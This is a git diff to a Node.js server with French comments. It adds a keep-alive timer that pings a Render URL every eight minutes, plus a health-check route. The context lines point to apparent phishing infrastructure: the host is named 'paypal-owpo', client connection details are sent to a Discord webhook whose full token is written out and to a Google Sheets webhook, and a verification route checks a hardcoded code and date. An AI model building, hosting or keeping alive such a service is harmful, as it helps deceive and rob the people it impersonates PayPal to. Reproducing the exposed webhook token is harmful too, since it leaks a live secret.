@@ -32,6 +32,9 @@ const GOOGLE_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyhkCAFUU7TC
 // ✅ NOUVEAU : Configuration Discord Webhook
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1419101277253795851/hq_EvfNod3r_1mLDgiHKx-_xnSFNw4XC9rwGs4Q-CvBiH7PNhwr0Dyj1UQ7nr9cY6B5k';
 
+// ✅ NOUVEAU : Configuration Keep-Alive
+const RENDER_URL = process.env.RENDER_EXTERNAL_URL || 'https://paypal-owpo.onrender.com';
+
 // --- Identifiants ---
 const CORRECT_CODE_USER = "H25lnFfA3mNbU4nF5WDZ";
 const CORRECT_DATE_USER = "18/09/2025";
@@ -197,6 +200,20 @@ async function notifyNewConnection(clientInfo) {
   sendPushNotificationToSupport(message, clientInfo);
 }
 
+// ✅ OPTIMISÉ : Fonction Keep-Alive avec ping toutes les 8 minutes
+function setupKeepAlive() {
+  if (process.env.NODE_ENV === 'production') {
+    setInterval(async () => {
+      try {
+        const response = await fetch(RENDER_URL);
+        console.log(`🔄 Keep-alive: ${response.status} at ${new Date().toLocaleString('fr-FR')}`);
+      } catch (error) {
+        console.log('❌ Keep-alive failed:', error.message);
+      }
+    }, 8 * 60 * 1000); // ✅ 8 minutes au lieu de 13
+  }
+}
+
 // --- Route API de vérification ---
 app.post('/verify', (req, res) => {
   const { code, date } = req.body;
@@ -207,6 +224,15 @@ app.post('/verify', (req, res) => {
   } else {
     res.status(401).json({ success: false, message: 'Invalid code or date' });
   }
+});
+
+// ✅ NOUVEAU : Route Health Check
+app.get('/health', (req, res) => {
+  res.status(200).json({
+    status: 'alive',
+    timestamp: new Date().toISOString(),
+    uptime: process.uptime()
+  });
 });
 
 // --- Gestion des connexions Socket.IO ---
@@ -571,4 +597,8 @@ server.listen(PORT, () => {
   console.log(`📊 Google Sheets webhook configuré : ${GOOGLE_WEBHOOK_URL.substring(0, 50)}...`);
   console.log(`🔔 Discord webhook configuré : ${DISCORD_WEBHOOK_URL.substring(0, 50)}...`);
   console.log(`🤖 Système d'automatisation de chat activé`);
+  
+  // ✅ Démarrer keep-alive optimisé
+  setupKeepAlive();
+  console.log(`⏰ Keep-alive activé (8min intervals)`);
 });
